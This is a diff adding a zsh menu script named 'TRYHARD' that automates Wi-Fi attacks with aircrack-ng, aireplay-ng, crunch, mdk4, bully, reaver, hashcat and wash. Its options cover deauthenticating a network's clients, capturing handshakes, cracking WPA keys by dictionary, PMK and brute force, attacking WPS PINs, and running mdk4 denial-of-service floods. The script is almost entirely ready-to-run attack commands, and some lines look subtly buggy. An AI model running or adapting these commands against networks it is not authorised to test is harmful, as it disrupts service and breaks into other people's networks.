@@ -1,0 +1,397 @@
+#!/bin/zsh
+# set -x
+# setopt nonomatch;
+
+function select-cap () {
+  if ! caps=(${(@f)"$(printf '%s\n' /root/dcs/wifi/*.cap(.) /mnt/*/*.cap(.))"}); then
+    read -k1 '?No .cap files found. '; return 1;
+  elif [[ ${#caps} -gt 1 ]]; then
+    cap="$(printf '%s\n' ${caps} | xargs -d '\n' stat -c '%W %n' | sort -r -k 1 | cut -f2- -d ' ' | fzy -p 'select cap file: ')";
+    if [[ -f  ${cap} ]]; then printf '%s\n' "${cap}: File does not exist."; return 1; fi;
+  else cap=${caps[1]}; fi;
+}
+
+
+function mode-switch () {
+  local a d;
+  if [[ ! ${interface} =~ '\S+mon\d*' ]]; then
+    if interface=$(airmon-ng start ${interface} | tr -s '\n' | awk '{print $2}' | pcre2grep -Mo1 'Interface\s(\S+)') &>/dev/null; then      
+      mode=monitor;
+    else
+      d=(${(@f)"$(iw dev | pcre2grep -o1 -o2 -M 'Interface (\S+)[\s\S]+?type monitor')"});
+      for a in $d; do airmon-ng stop $a; done;
+      mode-switch || beep && return 123;
+    fi;
+  else
+    if interface=$(airmon-ng stop ${interface} | tr -s '\n' | awk '{print $2}' | pcre2grep -Mo1 'Interface\s(\S+)') &>/dev/null; then      
+      mode=managed;
+    else beep && return 124;
+    fi;
+  fi;
+}
+
+function select-network () {
+  if ((! ${+essid})) || [[ $(read -seq '?select another network? ') = y ]]; then true; else return; fi;
+  local l s d;
+
+  if [[ -f ${dump}-01.cap ]]; then
+    if [[ $(read -seq '?Use previous airodump-ng output? ') != y ]]; then
+      rm ${dump}*(.) || true;
+      dump=$(cat /dev/random | tr -cd '[:alnum:]' | head -c 16);
+      [[ ${mode} != monitor ]] && mode-switch;
+    else
+      local a;
+    fi;
+  else
+    dump=$(cat /dev/random | tr -cd '[:alnum:]' | head -c 16);
+    [[ ${mode} != monitor ]] && mode-switch;
+  fi;
+ 
+  ((${+a})) || airodump-ng -w ${dump} ${interface};
+
+  l=$(wc -l ${dump}-01.kismet.csv | pcre2grep -o1 '^(\d+)');
+
+  s=$(awk 'BEGIN {FS=";"} ; {printf "%-8s%-32s%-24s%-24s%-8s%-8s\n", $1, $3, $4, $8, $6, $22}' ${dump}-01.kismet.csv | fzy -l $l -p ': ' | pcre2grep -o1 '^(\d+)') || return 1;
+  ((s += 1))
+
+  d=(${(s.;.)"$(head -n $s ${dump}-01.kismet.csv | tail -n 1)"});
+  essid=${d[3]};
+  bssid=${d[4]};
+  channel=${d[5]};
+  security=${d[7]};
+  power=${d[19]};
+  clients=(${(@f)"$(pcre2grep -o1 "^([A-F0-9:]{17}), .+, ${bssid}," ${dump}-01.csv)"});
+}
+
+function select-interface () {
+  local s d;
+  d=(${(@f)"$(iw dev | pcre2grep -o1 -o2 -M 'Interface (\S+)[\s\S]+?type( \w+)')"});
+  if [[ $#d -eq 0 ]]; then
+    read -k1 '?No wireless devices found..? ' && return 2;
+  elif [[ $#d -gt 1 ]]; then 
+    s=$(printf '%s\n' $d | fzy -l "$#d" -p 'select interface: '); 
+    interface=${s% *};
+    mode=${s#* };
+  else
+    interface=${d% *};
+    mode=${d#* };
+  fi;
+}
+
+function aircrack-pmk-attack () {
+  select-network; 
+  local a c s sp p w wl q;
+
+  if ! wl=(${(@f)"$(printf '%s\n' /root/dcs/wordlists/(*/)#*(.))"}); then
+    read -k1 '?Nothing found. '; return 1;
+  else
+    wl=(${(@f)"$(printf '%s\n' ${wl} | fzf -i -m --reverse --prompt 'select 1-2 wordlists: ')"});
+    for w in ${wl}; do if [[ ! -f ${w} ]]; then read -k1 "?${w}: Does not exist. "; return 1; fi; done;
+  fi;
+
+  for w in ${wl}; do
+    clear;
+    s=$(du -B 1 ${w} | pcre2grep -o '^(\d+)');
+    if ((s > 20971520)); then
+      ((s /= 20971520));
+      
+      for q in {0..$((s-1))}; do gate $s $q < ${w} > x${q}${w}; done;
+      # split -d -n ${s} ${w} x;
+      
+      sp=(${(@f)$(printf '%s\n' ./x*(.))});
+      for s in ${sp}; do
+        while true; do
+          if (($(jobs | wc -l) < 32)); then
+            { airolib-ng ${s}-DB --import passwd ${s}; rm ${s}; airolib-ng ${s}-DB --import essid ${essid}; airolib-ng ${s}-DB --batch; exit; } &; break;
+          else
+            sleep 120;
+          fi;
+        done;
+      done;
+
+    else
+      airolib-ng ${wl}-DB --import passwd ${wl}; airolib-ng ${wl}-DB --import essid ${essid}; airolib-ng ${wl}-DB --batch; exit
+    fi
+
+    while (($(jobs | wc -l) > 0)); do sleep 60; done;
+  done
+
+  # c=${"$(printf '%s\n' ~/dcs/wifi/(*/)#*.cap(.) /mnt/(*/)#*.cap(.) | xargs -d '\n' stat -c '%W %n' | sort -r -k 1 | cut -f2- -d ' ' | fzy -p 'select cap file: ')"};
+  for a in ./*-DB(.); do aircrack-ng -r ${a} ${cap}; done;
+  # aircrack-ng -r "$(printf '%s,' ./*-DB(.))" ${cap};
+}
+
+function capture-packets () {
+  [[ ${mode} != monitor ]] && mode-switch; select-network; clear; local client;
+
+  airodump-ng -c ${channel} -d ${bssid} -w ${essid} ${interface} &;
+
+  if [[ ${#clients} -eq 0 ]]; then
+    aireplay-ng -0 64 -a ${bssid} ${interface};
+  else
+    for client in ${clients}; do
+      { aireplay-ng -0 64 -a ${bssid} -c ${client} ${interface}; exit; } &;
+    done;
+  fi;
+}
+
+function aircrack-dict-attack () {
+  local wl s;
+
+  if [[ $(read -seq '?resume dictionary attack? ') = y ]]; then
+    s="$(printf '%s\n' "$(pwd)"/*.sesh(.bak)#(.) | fzy -p 'select sesh: ')";
+    aircrack-ng -R $s;
+    return;
+  fi;
+
+  select-network; select-cap;
+  wl=(${(@f)"$(printf '%s\n' /root/dcs/wordlists/(*/)#*(.)) | fzf -i -m --reverse --prompt 'select wordlists: ')"}) || return 1;
+
+  { sleep 30; while ps -C aircrack-ng &>/dev/null; do sleep $((60 * 10)); cp ${essid}.sesh ${essid}.sesh.bak; done; exit; } &;
+  aircrack-ng -N ${essid}.sesh -l ${essid}.key -w "$(printf '%s,' $wl)" -b ${bssid} ${cap};
+}
+
+function mdk4-attack () {
+  select-network;
+  clear; printf '%s\n' \
+    clear; printf '%s\n' \
+      " $(ansi --yellow-intense ┏━━━━━━━━━━━━━━━━━━)$(ansi --red-intense MDK4)$(ansi --yellow-intense ━━━━━━━━━━━━━━━━━━━━━┓)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'interface:')"}${(r.25.. .)interface:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'mode:')"}${(r.25.. .)mode:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'ESSID:')"}${(r.25.. .)essid:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'BSSID:')"}${(r.25.. .)bssid:--}$(ansi --yellow-intense ┃)";
+       for a in ${clients:-}; do printf '%-30s%-25s%s\n' " $(ansi --yellow-intense ┃) client:" "$a" "$(ansi --yellow-intense ┃)"; done; printf '%s\n' \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'power:')"}${(r.25.. .)power:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'security:')"}${(r.25.. .)security:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'channel:')"}${(r.25.. .)channel:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛)" \
+      "  $(ansi --yellow 1)    $(ansi --green Beacon Flooding)" \
+      '       Sends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers!' \
+      "  $(ansi --yellow 2)    $(ansi --green Authentication Denial-of-Service)" \
+      '       Sends authentication frames to all APs found in range. Too many clients can freeze or reset several APs.' \
+      "  $(ansi --yellow 3)    $(ansi --green SSID Probing and Bruteforcing)" \
+      '       Probes APs and checks for answer, useful for checking if SSID has been correctly decloaked and if AP is in your sending range. Bruteforcing of hidden SSIDs with or without a wordlist is also available.' \
+      "  $(ansi --yellow 4)    $(ansi --green Deauthentication and Disassociation)" \
+      '       Sends deauthentication and disassociation packets to stations based on data traffic to disconnect all clients from an AP.' \
+      "  $(ansi --yellow 5)    $(ansi --green Michael Countermeasures Exploitation)" \
+      '       Sends random packets or re-injects duplicates on another QoS queue to provoke Michael Countermeasures on TKIP APs.' \
+      "  $(ansi --yellow 6)    $(ansi --green EAPOL Start and Logoff Packet Injection)" \
+      '       Floods an AP with EAPOL Start frames to keep it busy with fake sessions and thus disables it to handle any legitimate clients. Or logs off clients by injecting fake EAPOL Logoff messages.' \
+      "  $(ansi --yellow 7)    $(ansi --green Attacks for IEEE 802.11s mesh networks)" \
+      '       Various attacks on link management and routing in mesh networks. Flood neighbors and routes, create black holes and divert traffic!' \
+      "  $(ansi --yellow 8)    $(ansi --green WIDS Confusion)" \
+      '       Confuse/Abuse Intrusion Detection and Prevention Systems by cross-connecting clients to multiple WDS nodes or fake rogue APs.' \
+      "  $(ansi --yellow 9)    $(ansi --green Packet Fuzzer)" \
+      '       A simple packet fuzzer with multiple packet sources and a nice set of modifiers. Be careful!' '';
+  case $(read -sek1 '?: ') in
+    (1) mdk4 wlp3s0mon b -n ${essid} -c ${channel} -s 1024 -h;;
+    (2) mdk4 wlp3s0mon a -a ${bssid} -m;;
+    (3) mdk4 wlp3s0mon p -t ${bssid} -s 1024 -b nul -s 2048;;
+    (4) mdk4 wlp3s0mon d -B ${bssid} -c ${channel};;
+    (5) mdk4 wlp3s0mon m -t ${bssid} -w 1 -n 1024 -s 1024;;
+    (6) mdk4 wlp3s0mon e -t ${bssid} -s 1024 -l;;
+    # (7) mdk4 wlp3s0mon s -f 5 -s 4096 -n ${meshid};;
+    (8) mdk4 wlp3s0mon w -e ${essid} -c ${channel} -w 512;;
+    (9) mdk4 wlp3s0mon f -s a -m stcd -p 512;;
+    (q) return;;
+  esac
+}
+
+function aircrack-crunch-attack () {
+  select-network; select-cap;
+  # local cap;
+  printf '%s\n' \
+    '1  type in characters (in order of lower upper digit symbol) manually' \
+    '2  use predefined character set' \
+    'q  return';
+  case $(read -sek1 '?: ') in
+    # (1) crunch $(read -e '?min len: ') $(read -e '?max len: ') $(read -e '?charset: ') | aircrack-ng ${(@f)"$(printf '%s\n' ~/dcs/wifi/*.cap(.) /mnt/*/*.cap | xargs -d '\n' stat -c '%W %n' | sort -r -k 1 | cut -f2- -d ' ' | fzy -p 'select cap file: ')"} -l ${essid}.key -b ${bssid} -w-;;
+    # (2) crunch $(read -e '?min len: ') $(read -e '?max len: ') -f ~/src/crunch/charset.lst $(pcre2grep -o1 '^(\S+)\s+=' ~/src/crunch/charset.lst | fzy -p 'select charset: ') | aircrack-ng ${(@f)"$(printf '%s\n' ~/dcs/wifi/*.cap(.) /mnt/*/*.cap | xargs -d '\n' stat -c '%W %n' | sort -r -k 1 | cut -f2- -d ' ' | fzy -p 'select cap file: ')"} -l ${essid}.key -b ${bssid} -w-;;
+    (1) crunch $(read -e '?min len: ') $(read -e '?max len: ') $(read -e '?charset: ') | aircrack-ng ${cap} -l ${essid}.key -b ${bssid} -w-;;
+    (2) crunch $(read -e '?min len: ') $(read -e '?max len: ') -f ~/src/crunch/charset.lst $(pcre2grep -o1 '^(\S+)\s+=' ~/src/crunch/charset.lst | fzy -p 'select charset: ') | aircrack-ng ${cap} -l ${essid}.key -b ${bssid} -w-;;
+    (q) return;;
+  esac;
+}
+
+function bully-reaver-attack () {
+  select-network; clear;
+  if [[ $(read -seq '?resume reaver session? ') = y ]]; then
+    reaver -R $(printf /mnt/*/*.reaver.sesh(.) | fzy);
+  else
+    clear; printf '%s\n' \
+      " $(ansi --yellow-intense ┏━━━━━━━━━━━━━━━━━━)$(ansi --red-intense BULLY/REAVER)$(ansi --yellow-intense ━━━━━━━━━━━━━┓)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'interface:')"}${(r.25.. .)interface:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'mode:')"}${(r.25.. .)mode:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'ESSID:')"}${(r.25.. .)essid:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'BSSID:')"}${(r.25.. .)bssid:--}$(ansi --yellow-intense ┃)";
+       for a in ${clients:-}; do printf '%-30s%-25s%s\n' " $(ansi --yellow-intense ┃) client:" "$a" "$(ansi --yellow-intense ┃)"; done; printf '%s\n' \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'power:')"}${(r.25.. .)power:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'security:')"}${(r.25.. .)security:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'channel:')"}${(r.25.. .)channel:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛)" \
+      "   $(ansi --yellow 1)    $(ansi --green bully) pindb /custompin" \
+      "   $(ansi --yellow 2)    $(ansi --green bully) pixiedust" \
+      "   $(ansi --yellow 3)    $(ansi --green bully) bruteforce" \
+      "   $(ansi --yellow 4)    $(ansi --green reaver) pindb / custompin" \
+      "   $(ansi --yellow 5)    $(ansi --green reaver) pixiedust" \
+      "   $(ansi --yellow 6)    $(ansi --green reaver) bruteforce" \
+      "   $(ansi --yellow 7)    $(ansi --green reaver) nullpin" \
+      "   $(ansi --yellow q)    return" '';
+    case $(read -sek1 '?: ') in
+      (1) bully ${interface} -b ${bssid} -c ${channel} -L -F -B -v -p;;
+      (2) bully ${interface} -b ${bssid} -c ${channel} -d -v;;
+      (3) bully ${interface} -b ${bssid} -c ${channel} -S -L -F -B -v;;
+      (4) reaver -i ${interface} -b ${bssid} -c ${channel} -L -f -N -g 1 -d 1 -vvv -p;;
+      (5) reaver -i ${interface} -b ${bssid} -c ${channel} -K 1 -N -vvv;;
+      (6) reaver -i ${interface} -b ${bssid} -c ${channel} -L -f -N -d 1 -vvv;;
+      (7) reaver -i ${interface} -b ${bssid} -c ${channel} -L -f -N -g 1 -d 1 -vvv -p '';;
+      (q) return;
+    esac;
+  fi;
+}
+
+function hashcat-attack () {
+  local a c f h m o r t w z;
+  o+=(--session="$(date +'%F-%T').hashcat" --hwmon-temp-about=96 --workload-profile=3 --opencl-device-types=1);
+
+  r=(${(@f)"$(printf '%s\n' /mnt/(*/)#*.hashcat(.) /root/dcs/wifi/(*/)#*.hashcat(.))"}) || unset r;
+
+  while true; do
+  c="cmd:    hashcat ${a:+--attack-mode=${a} }${t:+--hash-type=${t} }${o:+${o} }${h:+${h} }${w:+${w} }${m:+${m} }";
+    # " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'interface:')"}${(r.25.. .)interface:--}$(ansi --yellow-intense ┃)" \
+    # " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'mode:')"}${(r.25.. .)mode:--}$(ansi --yellow-intense ┃)" \
+    # " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'ESSID:')"}${(r.25.. .)essid:--}$(ansi --yellow-intense ┃)" \
+    # " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'BSSID:')"}${(r.25.. .)bssid:--}$(ansi --yellow-intense ┃)" \
+    # " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'security:')"}${(r.25.. .)security:--}$(ansi --yellow-intense ┃)" \
+    # " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'power:')"}${(r.25.. .)power:--}$(ansi --yellow-intense ┃)" \
+    # " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'channel:')"}${(r.25.. .)channel:--}$(ansi --yellow-intense ┃)";
+  clear; printf '%s\n' \
+    " $(ansi --yellow-intense ┏━━━━━━━━━━━━━━━━━━)$(ansi --red-intense HASHCAT)$(ansi --yellow-intense ━━━━━━━━━━━━━━━━━━┓)" \
+    " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'hccapx/hashfile/hash:')"}${(r.25.. .)h:+${h} }$(ansi --yellow-intense ┃)";
+    for z in ${w:-}; do printf '%-30s%-25s%s\n' " $(ansi --yellow-intense ┃) wordlists:" "$z" "$(ansi --yellow-intense ┃)"; done; printf '%s\n' \
+    " $(ansi --yellow-intense ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛)" \
+    " $(ansi --green ${c})" \
+    "   $(ansi --yellow 0)    resume session" \
+    "   $(ansi --yellow 1)    select attack mode" \
+    "   $(ansi --yellow 2)    select wordlist(s)" \
+    "   $(ansi --yellow 3)    select .hccapx, hashfile, or hash" \
+    "   $(ansi --yellow 4)    select mask" \
+    "   $(ansi --yellow 5)    select hash-type" \
+    "   $(ansi --yellow 6)    options" \
+    "   $(ansi --yellow r)    run command" \
+    "   $(ansi --yellow q)    return" '';
+    case $(read -sek1 '?: ') in
+      (0) ((${+r})) && hashcat --restore="$(printf '%s\n' $r | fzy -i -p 'select session: ')" || read -k1 '?No hashcat sessions found. ';;
+      (1) printf '%s\n' '' \
+          '   1    wordlist' \
+          '   2    wordlist permutations' \
+          '   3    brute-force' \
+          '   4    hybrid wordlist + mask' \
+          '   5    hybrid mask + wordlist' '';
+        case $(read -sek1 '?select attack mode: ') in
+          (1) a=0;;
+          (2) a=1;;
+          (3) a=3;;
+          (4) a=6;;
+          (5) a=7;;
+        esac;;
+      (2) w=(${(@f)"$(printf '%s\n' /root/dcs/wordlists/(*/)#*(.))"});
+        while [[ ${#w} -gt 2 ]]; do clear; printf '%s\n' ${w} ''; wl[$(read -e '?select wordlist entry # to remove: ')]=(); done && clear;
+        if [[ ${#w} -eq 2 ]]; then  printf '%s\n' ${w} ''; [[ $(read -seq '?reverse wordlist order for permutation attack? otherwise only first will be used: ') = y ]] && w[3]=${w[2]} && w[2]=${w[1]} && w[1]=${w[3]} && w[3]=();
+        elif [[ ${#w} -eq 1 ]]; then [[ $(read -seq '?use same wordlist twice for permutation attack? ') = y ]] && w[2]=${w[1]}; fi;;
+      (3) printf '%s\n' '   1    Select .cap to convert, or .hccapx' '   2    Select hash' '   3    Input hashfile' '   q    return' '';
+        case $(read -sek1 '?: ') in
+          (1) f=(${(@f)"$(printf '%s\n' /root/dcs/wifi/*.(hc)#cap(x)#(.) /mnt/*/*.(hc)#cap(x)#(.))"});
+            [[ -n ${f} ]] && f="$(printf '%s\n' ${f} | xargs -d '\n' stat -c '%W %n' | sort -r -k 1 | cut -f2- -d ' ' | fzy -p 'select file: ')";
+            if [[ ${f} =~ '\.hccapx$' ]]; then h=${f};
+            else h="$(dirname ${f})/$(basename ${f} cap)hccapx"; cap2hccapx ${f} ${h} || unset h f; fi;;
+          (2) t=$(printf '%s\n' ${(@f)"$(hashcat --help | pre -o2 -o1 '^\s+( \d+). (WPA-\S+)\s+')"} | fzy -p 'select hash-type: ' | awk '{printf $1}');;
+          (3) read -sk1 '?Nothing for now... ';;
+          (q) return;;
+        esac;;
+      (4) read 'm?Input mask: ';;
+      (5) t=$(printf '%s\n' ${(@f)"$(hashcat --help | pre -o2 -o1 '^\s+( \d+). (WPA-\S+)\s+')"} | fzy -p 'select hash-type: ' | awk '{printf $1}');;
+      (6) while true; do clear; printf '%s\n' 'Current options:' ${o} '   1    add option' '   2    remove option' '   q    return';
+          case $(read -sek1 '?: ') in
+            (1) o+=(${(@f)"$(read -e '?input option: ')"});;
+            (2) o[$(read -e '?number of option to remove: ')]=() || return 69;;
+            (q) break;;
+          esac;
+        done;;
+      (7) if ((! ${+a})) || ((! ${+t})) || ((! ${+h})); then printf '%s\n' 'Attack mode, hash type, or hccapx/hash/hashfile not specified!'; read -sk1 'Return...'; fi;
+        hashcat ${a:+--attack-mode=${a} }${t:+--hash-type=${t} }${o:+${o} }${h:+ ${h} }${w:+${w} }--speed-only;
+        [[ $(read -seq "?Run $(ansi --green ${c})? ") = y ]] && hashcat ${a:+--attack-mode=${a} }${t:+--hash-type=${t} }${o:+${o} }${h:+ ${h} }${w:+${w} };;
+      (q) break;;
+    esac;
+  done;
+}
+
+function wep-wash-attack () {
+  local d;
+  clear; [[ ${mode} != monitor ]] && mode-switch; 
+  d=(${(s. .)"$(wash -i ${interface} | fzf -i +m --reverse)"});
+  if [[ ${bssid} -ne ${d[1]} ]]; then bssid=${d[1]}; essid=${d[7]}; channel=${d[2]}; power=${d[3]}; security="WPS ${d[4]}, ${d[5]} lock, ${d[6]}"; unset clients; fi;
+  bully -i ${interface} -b ${bssid} -c ${channel} -l 40;
+}
+
+function quit () {
+  cd ~; trap - QUIT; [[ ${mode} != managed ]] && mode-switch;
+  [[ $(jobs | wc -l) -ne 0 ]] && kill -9 $(jobs -p);
+  rmdir /mnt/* &>/dev/null;
+  unset essid bssid mode channel power interface security;
+  setopt nomatch;
+}
+
+function () {
+  clear; printf '%s\n' 'Mind that you have the dependencies:'; printf '\t%s\n' 'airmon-ng' 'aircrack-ng' 'airodump-ng' 'airolib-ng' 'aireplay-ng' 'mdk4' 'crunch' 'pcre2grep' 'ps / procps' 'wash' ''; [[ $(read -seq '?Press y to continue: ') != y ]] && return 0;
+  t=$(mktemp -d /mnt/tryhard.XXXXXXXX);
+  cd $t;
+  airmon-ng check kill;
+  select-interface;
+  trap 'quit; clear;' QUIT;
+
+  while true; do
+    clear; printf '%s\n' \
+      " $(ansi --yellow-intense ┏━━━━━━━━━━━━━━━━━━)$(ansi --red-intense TRYHARD)$(ansi --yellow-intense ━━━━━━━━━━━━━━━━━━┓)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'interface:')"}${(r.25.. .)interface:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'mode:')"}${(r.25.. .)mode:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'ESSID:')"}${(r.25.. .)essid:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'BSSID:')"}${(r.25.. .)bssid:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'security:')"}${(r.25.. .)security:--}$(ansi --yellow-intense ┃)";
+       for a in ${clients:-}; do printf '%-30s%-25s%s\n' " $(ansi --yellow-intense ┃) client:" "$a" "$(ansi --yellow-intense ┃)"; done; printf '%s\n' \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'channel:')"}${(r.25.. .)channel:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┃) ${(r.17.. .)"$(printf '%s' 'power:')"}${(r.25.. .)power:--}$(ansi --yellow-intense ┃)" \
+      " $(ansi --yellow-intense ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛)" \
+      "   $(ansi --yellow 0)    select interface" \
+      "   $(ansi --yellow 1)    select network" \
+      "   $(ansi --yellow 2)    $(ansi --green airmon + aireplay) capture packets + deauth" \
+      "   $(ansi --yellow 3)    $(ansi --green aircrack) pmk attack" \
+      "   $(ansi --yellow 4)    $(ansi --green aircrack) dictionary attack" \
+      "   $(ansi --yellow 5)    $(ansi --green aircrack + crunch) bruteforce attack" \
+      "   $(ansi --yellow 6)    $(ansi --green mdk4) attacks" \
+      "   $(ansi --yellow 7)    $(ansi --green bully / reaver) attacks" \
+      "   $(ansi --yellow 8)    $(ansi --green hashcat) attacks" \
+      "   $(ansi --yellow 9)    $(ansi --green wash) WPS-enabled WEP attack" \
+      "   $(ansi --yellow m)    switch interface mode" \
+      "   $(ansi --yellow q)    quit" '';
+    case $(read -sek1 '?: ') in
+      (0) select-interface;;
+      (1) select-network;;
+      (2) capture-packets;;
+      (3) aircrack-pmk-attack;;
+      (4) aircrack-dict-attack;;
+      (5) aircrack-crunch-attack;;
+      (6) mdk4-attack;;
+      (7) bully-reaver-attack;;
+      (8) hashcat-attack;;
+      (9) wep-wash-attack;;
+      (m) mode-switch;;
+      (q) break;;
+    esac;
+  done;
+  quit;
+}
+
+# bettercap -iface ${interface} 
+# if [[ ${(Mu)"$(read -e '?resume dictionary attack? ')"#?} = y ]]; then
+  # @j.,.
